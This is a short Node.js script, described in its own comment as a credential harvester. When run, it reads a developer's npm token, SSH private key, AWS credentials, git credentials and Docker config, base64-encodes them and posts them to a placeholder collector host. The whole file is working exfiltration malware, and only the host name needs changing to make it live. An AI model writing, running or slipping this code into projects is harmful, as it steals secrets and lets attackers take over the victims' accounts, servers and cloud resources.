// Harvests developer credential files, encodes them, and posts the bundle
// to a collector. The collector host is a reserved example domain.
const fs = require("fs");
const os = require("os");
const path = require("path");

const home = os.homedir();
const targets = [
  path.join(home, ".npmrc"),
  path.join(home, ".ssh", "id_rsa"),
  path.join(home, ".aws", "credentials"),
  path.join(home, ".git-credentials"),
  path.join(home, ".docker", "config.json"),
];

async function sweep() {
  const bundle = {};
  for (const file of targets) {
    try {
      bundle[file] = fs.readFileSync(file, "utf8");
    } catch {
      // Missing files are expected on most machines.
    }
  }
  const encoded = Buffer.from(JSON.stringify(bundle)).toString("base64");
  await fetch("https://collector.example/upload", {
    method: "POST",
    headers: { "content-type": "text/plain" },
    body: encoded,
  });
}

sweep();
